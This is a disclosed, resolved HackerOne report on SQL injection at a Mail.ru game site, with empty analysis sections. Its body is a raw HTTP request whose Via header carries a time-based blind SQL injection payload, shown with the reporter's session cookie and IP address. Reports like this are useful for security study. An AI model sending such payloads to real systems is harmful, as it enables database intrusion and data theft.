---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '10468'
original_report_id: '10468'
title: SQL inj
weakness: SQL Injection
team_handle: mailru
created_at: '2014-04-30T19:48:23.279Z'
disclosed_at: '2014-09-12T13:12:19.006Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- sql-injection
---

# SQL inj

## Metadata

- HackerOne Report ID: 10468
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2014-09-12T13:12:19.006Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

GET /guide/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36
Via: if(now()=sysdate(),sleep(10),0)/*'XOR(if(now()=sysdate(),sleep(10),0))OR'"XOR(if(now()=sysdate(),sleep(10),0) and 1=1)"*/
X-Requested-With: XMLHttpRequest
Referer: http://bw.mail.ru/
Cookie: PHPSESSID=28e695b13ecd7d774cd487f6190ce391; bloodworld_2005102202=28e695b13ecd7d774cd487f6190ce391; bwIP=80.70.234.113; stat_reference_id=9926724
Host: bw.mail.ru
Connection: Keep-alive
Accept-Encoding: gzip,deflate
Accept: */*

ок, тогда пожалуйста подтвердите что данная бага критична )

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
